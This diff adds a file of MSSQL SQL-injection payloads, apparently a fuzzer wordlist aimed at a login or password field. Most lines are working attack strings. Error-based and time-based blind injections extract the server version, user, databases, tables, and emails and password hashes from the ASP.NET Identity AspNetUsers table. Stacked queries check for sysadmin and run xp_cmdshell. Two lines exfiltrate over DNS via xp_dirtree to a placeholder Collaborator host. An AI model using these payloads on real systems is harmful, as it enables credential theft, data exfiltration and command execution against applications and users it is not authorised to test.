@@ -1,0 +1,62 @@
+# ── Baseline sanity check ─────────────────────────────────────────────────────
+# These should return 200 (clean) — confirms differential is working
+ValidPass1
+ValidPass1--
+ValidPass1;--
+
+# ── Quote probes ──────────────────────────────────────────────────────────────
+# These should return 200 (clean) — confirms differential is working
+ValidPass1'
+ValidPass1''
+ValidPass1"
+
+# ── Error-based: version extraction ───────────────────────────────────────────
+ss' AND 1=CONVERT(int,@@version)-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 @@version))-- wXyW
+ss'; SELECT CONVERT(int,@@version)-- wXyW
+
+# ── Error-based: current user ─────────────────────────────────────────────────
+ss' AND 1=CONVERT(int,SYSTEM_USER)-- wXyW
+ss' AND 1=CONVERT(int,USER_NAME())-- wXyW
+ss' AND 1=CONVERT(int,ORIGINAL_LOGIN())-- wXyW
+
+# ── Error-based: current database ────────────────────────────────────────────
+ss' AND 1=CONVERT(int,DB_NAME())-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- wXyW
+
+# ── Error-based: enumerate databases ─────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT name FROM master..sysdatabases FOR XML PATH('')))-- wXyW
+
+# ── Error-based: table enumeration ───────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_type='BASE TABLE'))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_NAME))-- wXyW
+
+# ── Error-based: AspNetUsers (Identity framework default table) ───────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 UserName FROM AspNetUsers))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 PasswordHash FROM AspNetUsers))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+':'+PasswordHash FROM AspNetUsers))-- wXyW
+
+# ── Error-based: row 2+ using NOT IN ─────────────────────────────────────────
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 1 Email FROM AspNetUsers)))-- wXyW
+
+# ── Time-based: confirm execution without error dependency ────────────────────
+ss'; WAITFOR DELAY '0:0:5'-- wXyW
+ss' WAITFOR DELAY '0:0:5'-- wXyW
+ss'; IF (1=1) WAITFOR DELAY '0:0:5'-- wXyW
+
+# ── Time-based: conditional (boolean inference) ───────────────────────────────
+ss'; IF (SELECT COUNT(*) FROM AspNetUsers)>0 WAITFOR DELAY '0:0:5'-- wXyW
+ss'; IF (ASCII(SUBSTRING((SELECT TOP 1 Email FROM AspNetUsers),1,1)))>64 WAITFOR DELAY '0:0:5'-- wXyW
+
+# ── Stacked queries: privilege check ─────────────────────────────────────────
+ss'; SELECT IS_SRVROLEMEMBER('sysadmin')-- wXyW
+ss' AND 1=CONVERT(int,IS_SRVROLEMEMBER('sysadmin'))-- wXyW
+
+# ── Stacked queries: xp_cmdshell check (sysadmin only) ───────────────────────
+ss'; EXEC xp_cmdshell 'whoami'-- wXyW
+
+# ── OOB: DNS exfiltration via xp_dirtree (sysadmin) ─────────────────────────
+# Replace <collaborator> with your Burp Collaborator host
+ss'; EXEC master..xp_dirtree '//<collaborator>/a'-- wXyW
+ss'; DECLARE @q VARCHAR(255); SET @q='\\<collaborator>\a'; EXEC master..xp_dirtree @q-- wXyW
